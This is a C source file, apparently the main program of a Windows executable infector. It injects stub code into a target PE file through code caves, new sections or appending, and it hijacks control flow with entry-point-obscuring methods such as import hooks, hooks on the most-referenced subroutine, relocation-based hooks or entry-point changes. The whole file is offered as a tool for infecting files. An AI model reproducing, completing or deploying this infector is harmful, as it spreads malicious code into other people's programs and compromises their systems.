#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include "finfect.h"
#include "stub_inst.h"
#include "error.h"

static int infect_file_wrap(const TCHAR *path, enum inf_type_t inf_type, enum cntrl_redr_type_t cr_type)
{
	struct inf_stub inf_stubs[STUB_COUNT];
	/* use the code caves whenever possible, append to the last section if there aren't any code cave */
	const enum inf_type_t inf_p1[] = {code_cave_t, append_t, 0};
	/* use the code caves whenever possible, create a new section if there isn't any code cave for the stub,
	 * and append to the last section there are no rooms for new sections
	 */
	const enum inf_type_t inf_p2[] = {code_cave_t, new_sec_t, append_t, 0};

	/* EPO: hook an imported function */
	const enum cntrl_redr_type_t cr_p1[] = {epo_imp_ref_t, 0};
	/* EPO: hook the most refrenced subroutine */
	const enum cntrl_redr_type_t cr_p2[] = {epo_most_ref_subr_t, 0};
	/* EPO: use a relocation table to use to find cr reference instructions, */
	const enum cntrl_redr_type_t cr_p3[] = {epo_reloc_t, 0};
	/* just change the entry point */
	const enum cntrl_redr_type_t cr_p4[] = {ep_t, 0};
	struct infect_file_arg arg;

	populate_sdtls(inf_stubs);

	switch (inf_type) {
	case append_t:
		arg.inf_p = inf_p1;
		break;
	default:
		arg.inf_p = inf_p2;
		break;
	}

	switch (cr_type) {
	case epo_imp_ref_t:
		arg.cr_p = cr_p1;
		break;
	case epo_most_ref_subr_t:
		arg.cr_p = cr_p2;
		break;
	case epo_reloc_t:
		arg.cr_p = cr_p3;
		break;
	default:
		arg.cr_p = cr_p4;
		break;
	}

	arg.inf_stubs = inf_stubs;
	arg.nstubs = _countof(inf_stubs);
	return infect_file(path, &arg, NULL);
}

static void print_help(const char *argv0)
{
	printf("%s <infection type> <control redirection type> <file to infect>\n", argv0);
	puts("\ninfection types: \n");
	puts("\ta appends to the last section if there are no code caves\n");
	puts("\tn creates a new section if there are no code caves\n");
	puts("\ncontrol redirection type\n");
	puts("\ti - hook the import table\n");
	puts("\tm - hook the most referenced subroutine\n");
	puts("\tr - hook a subroutine using the relocation table\n");
	puts("\te - hook the entry point\n");
}

int main(int argc, char *argv[])
{
	enum inf_type_t inf_type;
	enum cntrl_redr_type_t cr_type;
	int res;

	if (argc == 1) {
		/* we are being run without arguments, so just display the message box */
		MessageBox(NULL, TEXT("what kind of sorcery is this?"), TEXT("what the hell?!"), MB_OK);
		return 1;
	}

	if (argc != 4) {
		print_help(argv[0]);
		return 1;
	}

	switch (*argv[1]) {
	case 'a':
		inf_type = append_t;
		break;
	case 'n':
		inf_type = new_sec_t;
		break;
	default:
		print_help(argv[0]);
		return 1;
	}

	switch (*argv[2]) {
	case 'i':
		cr_type = epo_imp_ref_t;
		break;
	case 'm':
		cr_type = epo_most_ref_subr_t;
		break;
	case 'r':
		cr_type = epo_reloc_t;
		break;
	case 'e':
		cr_type = ep_t;
		break;
	default:
		print_help(argv[0]);
		return 1;
	}

	res = infect_file_wrap(argv[3], inf_type, cr_type);
	if (res != 0) {
		printf("Error infecting %s\nError: %s\n", argv[3], err2str(res));
		return 1;
	}
	return 0;
}